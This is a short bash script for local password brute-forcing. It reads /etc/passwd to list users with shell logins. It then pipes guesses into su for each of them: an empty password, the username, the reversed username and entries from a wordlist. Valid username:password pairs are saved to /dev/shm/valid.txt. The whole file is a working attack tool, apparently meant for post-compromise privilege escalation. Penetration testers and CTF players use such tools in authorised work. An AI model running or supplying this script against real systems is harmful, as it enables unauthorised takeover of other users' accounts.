#!/bin/bash

# Test passwords you've gathered for other users on the machine
# Doing this takes way more time than it should, especially considering waiting for the buffer after each guess
# Takes in text file parameter

users=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)

sucheck(){
    sucheck=$(echo "$2" | timeout 1 su $user -c whoami 2>/dev/null);
    if [ "$sucheck" ]; then 
        echo "  You can login as $user using password: $2" && echo "$1:$2" >> /dev/shm/valid.txt
        fi
    }

printf "%s\n" "$users" | while read user; do
    sucheck "$user" ""
    sucheck "$user" "$user"
    sucheck "$user" "$hostname"
    sucheck "$user" "$(echo $user | rev 2>/dev/null)"
    if [ -f "$1" ]; then
        while IFS=' ' read -r guess; do
            sucheck "$user" "$guess"
            sleep 0.01
        done < "$1"
    fi
done